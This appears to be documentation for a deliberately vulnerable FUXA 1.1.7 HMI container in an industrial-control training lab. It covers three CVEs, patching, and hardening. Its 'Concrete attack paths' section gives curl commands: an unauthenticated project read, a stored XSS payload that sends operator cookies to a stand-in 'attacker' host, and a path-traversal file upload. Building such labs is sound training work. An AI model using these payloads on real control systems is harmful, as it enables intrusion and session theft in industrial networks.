# Control HMI

`uupl-hmi` is the operator workstation for the UU P&L control zone. It runs
FUXA 1.1.7, pinned to this release because it carries three documented
vulnerabilities the scenario is built around. The web interface on port 1881
has no meaningful access control in its default state: the project configuration
is readable by anyone without credentials, writable by anyone without credentials,
and the file upload endpoint does not sanitise the destination path.

## In real control networks

HMIs sit at the top of the control hierarchy and are the point from which
operators read plant state and issue commands. Compromising the HMI means
compromising the operator's view of the process: injected false data, suppressed
alarms, or modified control scripts reach operators as if they were legitimate.
FUXA is an open-source HMI platform used in smaller OT deployments; the 1.1.7
CVE chain is a realistic example of the class of vulnerability that appears in
rapidly-developed industrial web tools.

## Container details

Base image: `frangoteam/fuxa:1.1.7`. Node.js application. No SSH. No login
shell. Port 1881 only.

The image installs `modbus-serial` at build time so the Modbus TCP device
plugin works. `entrypoint.sh` starts FUXA, waits for the API to be ready,
then seeds a project named "UUPL Control HMI" via POST `/api/project`. The
seeded project includes a `ModbusTCP` device (`hex-turbine-plc`, 10.10.3.21:502)
with all PLC tags: input registers for turbine telemetry, holding registers for
setpoints and valve commands, and the emergency stop coil. These appear in the
unauthenticated project export.

Default account: `admin`, `groups: -1` (superadmin). No password is set at
startup; anonymous read access is active and the POST endpoints accept requests
without authentication in this version.

Project data is stored in FUXA's `_appdata` directory inside the container. It
is not volume-mounted; changes do not persist across container restarts.

## Connections

- `ics_control`: 10.10.3.10
- Not reachable from enterprise, DMZ, or internet zones (control zone firewall)
- Accessible from engineering workstation (10.10.3.100)

## Protocols

HTTP: port 1881 (FUXA web UI and API).

## Built-in vulnerabilities

CVE-2023-32547, unauthenticated project read: GET `/api/project` returns the
full project JSON without any credentials. The project contains device
connection parameters, tag names, view layout, and any credentials embedded
in the configuration. No session or token is required.

CVE-2023-32546, stored XSS via project write: POST `/api/project` also accepts
requests without authentication in this version. An attacker can inject
arbitrary content into the project JSON. FUXA renders project content in
operator browsers; malicious script content injected here executes in the
context of any operator session that loads the project. Exfiltrating session
tokens, redirecting operators to attacker-controlled pages, or silently
modifying what operators see are all within scope.

CVE-2023-32545, path traversal via file upload: the `/api/upload` endpoint does
not sanitise the destination filename. An attacker can write files to arbitrary
locations on the container filesystem by supplying a traversal path in the
upload request. In a deployment with a persistent volume, this extends to
persistent storage.

No password on the admin account: the `admin` user has `groups: -1`
(superadmin) and no password set. Any client can authenticate as admin or
operate anonymously within the permissive default.

## Modifying vulnerabilities

To pin to a patched FUXA release: change the `FROM frangoteam/fuxa:1.1.7`
line in the Dockerfile to a post-fix version. The three CVEs were addressed
after 1.1.7.

To set the admin password: after the container starts, POST to
`/api/user` with the new credentials before participants have access.

To add TLS: place a reverse proxy (nginx or traefik) in front of port 1881
with a certificate. FUXA itself has no native TLS support in this version.

## Hardening suggestions

Upgrade to a post-CVE-2023-32547 release. Set a strong password on the admin
account immediately after deployment. Disable anonymous access. Restrict
network access to port 1881 to specific operator workstations. Consider a
reverse proxy for TLS termination and request filtering.

## Observability and debugging

```bash
docker logs uupl-hmi
docker exec -it uupl-hmi sh
curl http://10.10.3.10:1881/api/project          # unauthenticated read
curl http://10.10.3.10:1881/api/users            # user list without auth
```

The web UI is at `http://10.10.3.10:1881/`. FUXA takes 2-3 seconds after
startup before the API is ready; the entrypoint waits for it before seeding
the project.

## Concrete attack paths

From the engineering workstation (10.10.3.100) or any host with a route to
10.10.3.10:1881:

Read the project configuration without credentials:
```bash
curl http://10.10.3.10:1881/api/project
```

Inject a stored XSS payload into the project (executes in any operator browser
that loads the view):
```bash
curl -X POST http://10.10.3.10:1881/api/project \
  -H 'Content-Type: application/json' \
  -d '{"version":"1.00","hmi":{"views":[{"name":"main","items":[{"id":"x","type":"html","property":{"html":"<script>fetch(\"http://attacker/?\"+document.cookie)</script>"}}]}]}}'
```

Write an arbitrary file via path traversal upload:
```bash
curl -X POST http://10.10.3.10:1881/api/upload \
  -F "file=@payload.txt;filename=../../tmp/pwned"
```

## At a glance

FUXA 1.1.7 HMI, port 1881. Unauthenticated read and write on the project API.
Path traversal on the upload endpoint. No SSH, no login shell. The operator
view can be read, replaced, or injected without credentials from any host on
the control network.
